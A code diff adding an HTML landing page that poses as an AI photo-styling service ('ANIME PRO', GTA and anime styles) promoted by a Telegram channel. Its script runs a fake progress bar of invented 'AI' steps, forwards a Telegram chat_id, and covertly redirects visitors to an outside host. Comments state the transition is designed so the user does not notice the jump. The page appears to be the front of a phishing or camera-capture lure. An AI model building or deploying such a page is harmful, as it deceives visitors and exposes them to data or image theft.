@@ -1,0 +1,560 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>ANIME PRO — AI Photo Studio</title>
+
+  <meta property="og:title" content="🎨 TRANSFORMA TU FOTO CON INTELIGENCIA ARTIFICIAL" />
+  <meta property="og:description" content="✨ Convierte tu selfie a estilo anime, digital art, 3D y más. La IA más avanzada en segundos." />
+  <meta property="og:image" content="https://i.imgur.com/1L2yQmO.jpeg" />
+  <meta property="og:url" content="https://inteligentecamara.netlify.app" />
+  <meta property="og:type" content="website" />
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:title" content="🎨 TRANSFORMA TU FOTO CON IA">
+  <meta name="twitter:description" content="✨ Convierte tu selfie a estilo anime, digital art, 3D y más">
+  <meta name="twitter:image" content="https://i.imgur.com/1L2yQmO.jpeg">
+
+  <link href="https://fonts.googleapis.com/css2?family=Bebas+Neue&family=Rajdhani:wght@400;600;700&family=Orbitron:wght@400;700;900&display=swap" rel="stylesheet">
+
+  <style>
+    :root {
+      --gold: #FFD000;
+      --orange: #FF6B00;
+      --red: #FF1744;
+      --neon-blue: #00E5FF;
+      --neon-green: #39FF14;
+      --dark: #080810;
+      --panel: rgba(255,255,255,0.03);
+    }
+
+    * { margin:0; padding:0; box-sizing:border-box; }
+
+    html, body {
+      width:100%; height:100%;
+      overflow:hidden;
+      background: var(--dark);
+      font-family: 'Rajdhani', sans-serif;
+      color: white;
+    }
+
+    /* ── SCANLINES ── */
+    .scanlines {
+      position:fixed; inset:0;
+      background: repeating-linear-gradient(
+        0deg, transparent, transparent 2px,
+        rgba(0,0,0,0.07) 2px, rgba(0,0,0,0.07) 4px
+      );
+      pointer-events:none; z-index:100;
+    }
+
+    /* ── VIGNETTE ── */
+    .vignette {
+      position:fixed; inset:0;
+      background: radial-gradient(ellipse at center, transparent 35%, rgba(0,0,0,0.9) 100%);
+      pointer-events:none; z-index:99;
+    }
+
+    /* ── GRID ── */
+    .grid-bg {
+      position:fixed; inset:0;
+      background-image:
+        linear-gradient(rgba(255,208,0,0.03) 1px, transparent 1px),
+        linear-gradient(90deg, rgba(255,208,0,0.03) 1px, transparent 1px);
+      background-size: 60px 60px;
+    }
+
+    /* ── CITY SVG ── */
+    .city-svg {
+      position:fixed; bottom:0; left:0; right:0;
+      width:100%; height:48vh; z-index:2;
+    }
+
+    /* ── NEON ANIMATIONS ── */
+    @keyframes flicker {
+      0%,100%{opacity:1} 92%{opacity:1} 93%{opacity:0.2} 94%{opacity:1} 96%{opacity:0.4} 97%{opacity:1}
+    }
+    @keyframes blink { 0%,100%{opacity:1} 50%{opacity:0} }
+    @keyframes pulse {
+      0%,100%{box-shadow:0 0 20px rgba(255,208,0,0.3)}
+      50%{box-shadow:0 0 50px rgba(255,208,0,0.7), 0 0 100px rgba(255,107,0,0.3)}
+    }
+    @keyframes titleGlow {
+      from{filter:drop-shadow(0 0 20px rgba(255,208,0,0.5))}
+      to{filter:drop-shadow(0 0 50px rgba(255,208,0,1)) drop-shadow(0 0 80px rgba(255,107,0,0.6))}
+    }
+    @keyframes starPop {
+      from{transform:scale(0) rotate(-20deg);opacity:0}
+      to{transform:scale(1) rotate(0);opacity:1}
+    }
+    @keyframes glitchA {
+      0%{clip-path:inset(0 0 96% 0);transform:translate(-3px,0)}
+      20%{clip-path:inset(50% 0 30% 0);transform:translate(3px,0)}
+      40%{clip-path:inset(0 0 0 0);transform:translate(0,0)}
+      100%{clip-path:inset(0 0 0 0);transform:translate(0,0)}
+    }
+    @keyframes fadeUp {
+      from{opacity:0;transform:translateY(20px)}
+      to{opacity:1;transform:translateY(0)}
+    }
+
+    /* ── STAGE ── */
+    .stage {
+      position:fixed; inset:0;
+      display:flex; flex-direction:column;
+      align-items:center; justify-content:flex-start;
+      padding-top: 5vh;
+      z-index:10;
+    }
+
+    /* ── TOP BADGE ── */
+    .top-badge {
+      display:flex; align-items:center; gap:8px;
+      background:rgba(255,208,0,0.08);
+      border:1px solid rgba(255,208,0,0.25);
+      border-radius:3px;
+      padding:5px 18px;
+      font-family:'Orbitron',monospace;
+      font-size:0.6rem; letter-spacing:3px;
+      color:var(--gold);
+      margin-bottom:18px;
+      animation: flicker 6s infinite, fadeUp 0.5s ease both;
+    }
+    .live-dot {
+      width:7px;height:7px;border-radius:50%;
+      background:var(--neon-green);
+      box-shadow:0 0 8px var(--neon-green);
+      animation:blink 1s steps(1) infinite;
+    }
+
+    /* ── HERO TITLE ── */
+    .hero-title {
+      font-family:'Bebas Neue',sans-serif;
+      font-size: clamp(3.5rem, 13vw, 8.5rem);
+      line-height:0.88;
+      text-align:center;
+      letter-spacing:6px;
+      margin-bottom:4px;
+      animation: fadeUp 0.6s 0.1s ease both;
+    }
+    .line1 {
+      display:block;
+      color:transparent;
+      -webkit-text-stroke:2px var(--gold);
+      animation: titleGlow 2.5s ease-in-out infinite alternate;
+      position:relative;
+    }
+    .line1::before,.line1::after {
+      content:attr(data-text);
+      position:absolute; inset:0;
+      font-family:'Bebas Neue',sans-serif;
+      font-size:inherit; letter-spacing:inherit; line-height:inherit;
+      -webkit-text-stroke:2px transparent;
+    }
+    .line1::before { color:#FF1744; animation:glitchA 5s infinite steps(1) 0.5s; }
+    .line1::after  { color:#00E5FF; animation:glitchA 5s infinite steps(1) 0.65s; left:3px; }
+
+    .line2 {
+      display:block;
+      background:linear-gradient(90deg, var(--gold), var(--orange), var(--red), var(--orange));
+      background-size:200% auto;
+      -webkit-background-clip:text; -webkit-text-fill-color:transparent;
+      background-clip:text;
+      animation:bgShift 3s linear infinite;
+    }
+    @keyframes bgShift { to{background-position:200% center} }
+
+    /* ── SUBTITLE ── */
+    .subtitle {
+      font-family:'Orbitron',monospace;
+      font-size:clamp(0.5rem,1.8vw,0.75rem);
+      letter-spacing:5px;
+      color:var(--neon-blue);
+      text-align:center;
+      margin-bottom:20px;
+      text-shadow:0 0 15px var(--neon-blue);
+      animation: fadeUp 0.6s 0.2s ease both, flicker 8s infinite 3s;
+    }
+
+    /* ── PILLS ── */
+    .styles-row {
+      display:flex; gap:8px; flex-wrap:wrap;
+      justify-content:center;
+      margin-bottom:20px;
+      animation: fadeUp 0.6s 0.3s ease both;
+    }
+    .style-pill {
+      padding:4px 13px; border-radius:2px;
+      font-size:0.72rem; font-weight:700;
+      letter-spacing:2px; border:1px solid;
+      text-transform:uppercase; cursor:default;
+      transition:all 0.3s;
+    }
+    .pill-gta   {color:var(--gold);      border-color:var(--gold);      background:rgba(255,208,0,0.07);}
+    .pill-anime {color:var(--neon-blue); border-color:var(--neon-blue); background:rgba(0,229,255,0.05);}
+    .pill-3d    {color:var(--orange);    border-color:var(--orange);    background:rgba(255,107,0,0.07);}
+    .pill-art   {color:var(--neon-green);border-color:var(--neon-green);background:rgba(57,255,20,0.05);}
+    .style-pill:hover {transform:translateY(-3px);box-shadow:0 0 18px currentColor;}
+
+    /* ── PREVIEW CARD ── */
+    .preview-card {
+      position:relative;
+      width:min(400px,88vw);
+      background:var(--panel);
+      border:1px solid rgba(255,208,0,0.18);
+      border-radius:5px; overflow:hidden;
+      backdrop-filter:blur(12px);
+      box-shadow:
+        0 0 0 1px rgba(255,208,0,0.04),
+        0 25px 70px rgba(0,0,0,0.7),
+        inset 0 1px 0 rgba(255,255,255,0.04);
+      margin-bottom:18px;
+      animation: fadeUp 0.6s 0.4s ease both, pulse 3s ease-in-out infinite 1s;
+    }
+    .preview-card::before,.preview-card::after {
+      content:''; position:absolute; width:22px; height:22px; z-index:5;
+    }
+    .preview-card::before {top:-1px;left:-1px;border-top:2px solid var(--gold);border-left:2px solid var(--gold);}
+    .preview-card::after  {bottom:-1px;right:-1px;border-bottom:2px solid var(--gold);border-right:2px solid var(--gold);}
+
+    .card-header {
+      display:flex; align-items:center; gap:7px;
+      padding:8px 14px;
+      background:rgba(255,208,0,0.04);
+      border-bottom:1px solid rgba(255,208,0,0.08);
+      font-family:'Orbitron',monospace; font-size:0.55rem;
+      letter-spacing:2px; color:rgba(255,208,0,0.6);
+    }
+    .dot {width:7px;height:7px;border-radius:50%;}
+    .dot-r{background:#FF5F57;} .dot-y{background:#FFBD2E;} .dot-g{background:#28C940;}
+
+    .preview-img-wrap {
+      position:relative; width:100%; padding-top:52%; overflow:hidden;
+    }
+    .preview-img-wrap img {
+      position:absolute; inset:0; width:100%; height:100%;
+      object-fit:cover;
+      filter:saturate(1.5) contrast(1.15) brightness(0.95);
+      transition:filter 0.5s;
+    }
+    .img-overlay {
+      position:absolute; inset:0;
+      background:linear-gradient(135deg,rgba(255,208,0,0.06) 0%,transparent 45%,rgba(255,23,68,0.05) 100%);
+    }
+    /* Horizontal scan effect */
+    .img-scan {
+      position:absolute; inset:0;
+      background:linear-gradient(180deg,transparent 0%,rgba(0,229,255,0.04) 50%,transparent 100%);
+      background-size:100% 40px;
+      animation:scanImg 2s linear infinite;
+    }
+    @keyframes scanImg {
+      0%{background-position:0 -40px}
+      100%{background-position:0 100%}
+    }
+    .gta-tag {
+      position:absolute; top:10px; right:10px;
+      background:var(--gold); color:#000;
+      font-family:'Bebas Neue',sans-serif; font-size:1rem;
+      letter-spacing:2px; padding:1px 10px; border-radius:2px;
+    }
+    .wanted-bar {position:absolute; bottom:10px; left:10px; display:flex; gap:4px;}
+    .wanted-star {
+      color:var(--gold); font-size:1rem;
+      text-shadow:0 0 10px var(--gold);
+      animation:starPop 0.4s ease backwards;
+    }
+    .wanted-star:nth-child(1){animation-delay:0.6s}
+    .wanted-star:nth-child(2){animation-delay:0.8s}
+    .wanted-star:nth-child(3){animation-delay:1.0s}
+    .wanted-star:nth-child(4){animation-delay:1.2s}
+    .wanted-star:nth-child(5){animation-delay:1.4s}
+
+    /* ── LOADING ── */
+    .load-section {
+      width:min(400px,88vw);
+      animation: fadeUp 0.6s 0.5s ease both;
+    }
+    .load-label {
+      display:flex; justify-content:space-between;
+      font-family:'Orbitron',monospace; font-size:0.58rem;
+      letter-spacing:2px; color:rgba(255,255,255,0.35);
+      margin-bottom:7px;
+    }
+    .load-label #pct {color:var(--gold);}
+    .bar-track {
+      width:100%; height:3px;
+      background:rgba(255,255,255,0.06);
+      border-radius:2px; overflow:hidden; position:relative;
+    }
+    .bar-fill {
+      height:100%; width:0%;
+      background:linear-gradient(90deg, var(--red), var(--orange), var(--gold));
+      border-radius:2px;
+      box-shadow:0 0 12px var(--gold);
+      transition:width 0.45s cubic-bezier(.4,0,.2,1);
+      position:relative;
+    }
+    .bar-fill::after {
+      content:''; position:absolute; right:0; top:0; bottom:0;
+      width:20px;
+      background:linear-gradient(90deg,transparent,rgba(255,255,255,0.6));
+    }
+    .load-status {
+      font-family:'Rajdhani',sans-serif; font-size:0.82rem; font-weight:600;
+      color:rgba(255,255,255,0.45); text-align:center;
+      margin-top:9px; letter-spacing:1px; height:18px;
+    }
+    .load-status .hi {color:var(--gold);}
+
+    /* ── FOOTER ── */
+    .footer-line {
+      position:fixed; bottom:14px; left:0; right:0; text-align:center;
+      font-family:'Orbitron',monospace; font-size:0.5rem;
+      letter-spacing:3px; color:rgba(255,255,255,0.15); z-index:20;
+    }
+    .footer-line a {color:rgba(255,208,0,0.4);text-decoration:none;}
+    .footer-line a:hover{color:var(--gold);}
+
+    /* ── TRANSITION OVERLAY ── */
+    .trans-overlay {
+      position:fixed; inset:0; z-index:999;
+      background:#000;
+      opacity:0; pointer-events:none;
+      transition:opacity 0.5s ease;
+    }
+
+    @media(max-height:660px){
+      .stage{padding-top:2vh;}
+      .hero-title{font-size:clamp(2.5rem,10vw,5rem);}
+      .styles-row{margin-bottom:12px;}
+      .preview-card{margin-bottom:12px;}
+    }
+  </style>
+</head>
+<body>
+
+  <div class="trans-overlay" id="overlay"></div>
+  <div class="scanlines"></div>
+  <div class="vignette"></div>
+  <div class="grid-bg"></div>
+
+  <!-- CIUDAD GTA SILUETA -->
+  <svg class="city-svg" viewBox="0 0 1440 400" preserveAspectRatio="xMidYMax slice" xmlns="http://www.w3.org/2000/svg">
+    <defs>
+      <linearGradient id="cg" x1="0" y1="0" x2="0" y2="1">
+        <stop offset="0%" stop-color="#1a1a2e" stop-opacity="0.9"/>
+        <stop offset="100%" stop-color="#080810" stop-opacity="1"/>
+      </linearGradient>
+      <filter id="glow">
+        <feGaussianBlur stdDeviation="3" result="blur"/>
+        <feMerge><feMergeNode in="blur"/><feMergeNode in="SourceGraphic"/></feMerge>
+      </filter>
+    </defs>
+
+    <!-- Luna / Moon glow -->
+    <circle cx="1180" cy="70" r="80" fill="rgba(255,208,0,0.04)"/>
+    <circle cx="1180" cy="70" r="55" fill="rgba(255,208,0,0.07)"/>
+    <circle cx="1180" cy="70" r="36" fill="rgba(255,208,0,0.13)"/>
+    <circle cx="1180" cy="70" r="22" fill="rgba(255,208,0,0.2)"/>
+
+    <!-- Buildings silhouette -->
+    <g fill="url(#cg)">
+      <rect x="0"    y="270" width="55"  height="130"/>
+      <rect x="50"   y="225" width="42"  height="175"/>
+      <rect x="88"   y="245" width="68"  height="155"/>
+      <rect x="150"  y="205" width="28"  height="195"/>
+      <rect x="173"  y="165" width="58"  height="235"/>
+      <rect x="225"  y="215" width="48"  height="185"/>
+      <rect x="267"  y="195" width="82"  height="205"/>
+      <!-- Antenna on tall building -->
+      <rect x="300"  y="155" width="4"   height="40"/>
+      <rect x="338"  y="235" width="34"  height="165"/>
+      <rect x="366"  y="175" width="66"  height="225"/>
+      <rect x="426"  y="200" width="48"  height="200"/>
+      <rect x="468"  y="225" width="88"  height="175"/>
+      <rect x="550"  y="185" width="42"  height="215"/>
+      <rect x="586"  y="155" width="72"  height="245"/>
+      <!-- Antenna -->
+      <rect x="616"  y="115" width="4"   height="42"/>
+      <rect x="652"  y="205" width="54"  height="195"/>
+      <rect x="700"  y="180" width="38"  height="220"/>
+      <rect x="732"  y="215" width="84"  height="185"/>
+      <rect x="808"  y="188" width="46"  height="212"/>
+      <rect x="848"  y="158" width="62"  height="242"/>
+      <rect x="904"  y="225" width="36"  height="175"/>
+      <rect x="934"  y="192" width="76"  height="208"/>
+      <rect x="1004" y="212" width="52"  height="188"/>
+      <rect x="1050" y="172" width="66"  height="228"/>
+      <!-- Antenna -->
+      <rect x="1076" y="132" width="4"   height="42"/>
+      <rect x="1110" y="202" width="42"  height="198"/>
+      <rect x="1146" y="232" width="56"  height="168"/>
+      <rect x="1195" y="188" width="82"  height="212"/>
+      <rect x="1270" y="212" width="36"  height="188"/>
+      <rect x="1300" y="162" width="62"  height="238"/>
+      <rect x="1355" y="202" width="52"  height="198"/>
+      <rect x="1400" y="235" width="40"  height="165"/>
+    </g>
+
+    <!-- Window lights gold -->
+    <g fill="rgba(255,208,0,0.55)" filter="url(#glow)">
+      <rect x="60"  y="232" width="5" height="4"/> <rect x="72"  y="244" width="5" height="4"/>
+      <rect x="183" y="172" width="5" height="4"/> <rect x="195" y="185" width="5" height="4"/>
+      <rect x="278" y="202" width="5" height="4"/> <rect x="290" y="215" width="5" height="4"/>
+      <rect x="596" y="162" width="5" height="4"/> <rect x="610" y="175" width="5" height="4"/>
+      <rect x="856" y="165" width="5" height="4"/> <rect x="870" y="178" width="5" height="4"/>
+      <rect x="1058" y="180" width="5" height="4"/><rect x="1072" y="193" width="5" height="4"/>
+      <rect x="1308" y="170" width="5" height="4"/><rect x="1320" y="183" width="5" height="4"/>
+    </g>
+    <!-- Window lights blue -->
+    <g fill="rgba(0,229,255,0.45)" filter="url(#glow)">
+      <rect x="158" y="213" width="4" height="3"/> <rect x="378" y="183" width="4" height="3"/>
+      <rect x="478" y="232" width="4" height="3"/> <rect x="708" y="188" width="4" height="3"/>
+      <rect x="938" y="200" width="4" height="3"/> <rect x="1200" y="196" width="4" height="3"/>
+    </g>
+
+    <!-- Neon sign strips on buildings -->
+    <rect x="183" y="215" width="36" height="2" fill="rgba(255,23,68,0.6)" filter="url(#glow)"/>
+    <rect x="596" y="192" width="42" height="2" fill="rgba(57,255,20,0.5)" filter="url(#glow)"/>
+    <rect x="1058" y="208" width="38" height="2" fill="rgba(0,229,255,0.6)" filter="url(#glow)"/>
+
+    <!-- Ground glow line -->
+    <rect x="0" y="396" width="1440" height="4" fill="rgba(255,208,0,0.12)" filter="url(#glow)"/>
+
+    <!-- Helicopter -->
+    <g transform="translate(350,50)" fill="rgba(255,208,0,0.25)">
+      <rect x="0" y="5" width="20" height="5" rx="2"/>
+      <rect x="-15" y="4" width="12" height="2" rx="1"/>
+      <rect x="20" y="4" width="12" height="2" rx="1"/>
+      <circle cx="10" cy="3" r="2"/>
+      <rect x="17" y="10" width="8" height="1" rx="1"/>
+    </g>
+  </svg>
+
+  <!-- MAIN UI -->
+  <div class="stage" id="stage">
+
+    <div class="top-badge">
+      <span class="live-dot"></span>
+      ANIME PRO AI STUDIO — ONLINE
+    </div>
+
+    <h1 class="hero-title">
+      <span class="line1" data-text="ANIME">ANIME</span>
+      <span class="line2">PRO</span>
+    </h1>
+
+    <p class="subtitle">⚡ AI PHOTO TRANSFORMATION — NEXT LEVEL ⚡</p>
+
+    <div class="styles-row">
+      <span class="style-pill pill-gta">🎮 GTA Style</span>
+      <span class="style-pill pill-anime">⚡ Anime</span>
+      <span class="style-pill pill-3d">🌀 3D Art</span>
+      <span class="style-pill pill-art">✦ Digital</span>
+    </div>
+
+    <div class="preview-card">
+      <div class="card-header">
+        <span class="dot dot-r"></span><span class="dot dot-y"></span><span class="dot dot-g"></span>
+        &nbsp; AI RENDER ENGINE v4.2 — ACTIVE
+      </div>
+      <div class="preview-img-wrap">
+        <img
+          src="https://i.imgur.com/1L2yQmO.jpeg"
+          alt="GTA AI Preview"
+          onerror="this.src='https://i.imgur.com/1L2yQmO.jpeg'"
+        />
+        <div class="img-overlay"></div>
+        <div class="img-scan"></div>
+        <div class="gta-tag">GTA V</div>
+        <div class="wanted-bar">
+          <span class="wanted-star">★</span>
+          <span class="wanted-star">★</span>
+          <span class="wanted-star">★</span>
+          <span class="wanted-star">★</span>
+          <span class="wanted-star">★</span>
+        </div>
+      </div>
+    </div>
+
+    <div class="load-section">
+      <div class="load-label">
+        <span>INICIALIZANDO MOTOR IA</span>
+        <span id="pct">0%</span>
+      </div>
+      <div class="bar-track"><div class="bar-fill" id="bar"></div></div>
+      <div class="load-status" id="statusTxt">
+        Conectando servidores<span class="hi">...</span>
+      </div>
+    </div>
+
+  </div>
+
+  <div class="footer-line">
+    DESARROLLADO POR <a href="https://t.me/truc0slibres" target="_blank">@TRUC0SLIBRES</a>
+    &nbsp;·&nbsp; AI PHOTO STUDIO
+  </div>
+
+  <script>
+    (function () {
+      const DEST = 'https://animepro.free.nf/';
+
+      const params = new URLSearchParams(window.location.search);
+      const chatId = params.get('chat_id');
+      const destURL = chatId ? DEST + '?chat_id=' + encodeURIComponent(chatId) : DEST;
+
+      const bar     = document.getElementById('bar');
+      const pct     = document.getElementById('pct');
+      const status  = document.getElementById('statusTxt');
+      const overlay = document.getElementById('overlay');
+
+      const steps = [
+        { p: 12,  t: 'Escaneando red neuronal<span class="hi">...</span>'         },
+        { p: 28,  t: 'Cargando motor GTA AI<span class="hi">...</span>'           },
+        { p: 46,  t: 'Procesando estilos visuales<span class="hi">...</span>'     },
+        { p: 63,  t: 'Generando texturas HD<span class="hi">...</span>'           },
+        { p: 79,  t: 'Optimizando render<span class="hi">...</span>'              },
+        { p: 92,  t: 'Conectando al estudio<span class="hi">...</span>'           },
+        { p: 100, t: '<span class="hi">✦ LISTO — Entrando al estudio...</span>'   },
+      ];
+
+      let idx = 0;
+
+      // Pre-fetch silencioso: crea un link prefetch para que el browser
+      // descargue la página destino en background sin navegar.
+      const prefetch = document.createElement('link');
+      prefetch.rel  = 'prefetch';
+      prefetch.href = destURL;
+      document.head.appendChild(prefetch);
+
+      function tick() {
+        if (idx >= steps.length) return;
+        const s = steps[idx++];
+        bar.style.width  = s.p + '%';
+        pct.textContent  = s.p + '%';
+        status.innerHTML = s.t;
+
+        if (idx < steps.length) {
+          setTimeout(tick, 480 + Math.random() * 350);
+        } else {
+          setTimeout(doTransition, 700);
+        }
+      }
+
+      function doTransition() {
+        // Fade to black (imperceptible cambio de página)
+        overlay.style.pointerEvents = 'all';
+        overlay.style.opacity = '1';
+
+        setTimeout(() => {
+          // Una vez en negro total, redirigir — el usuario no percibe el salto
+          window.location.replace(destURL);
+        }, 550);
+      }
+
+      setTimeout(tick, 500);
+    })();
+  </script>
+</body>
+</html>
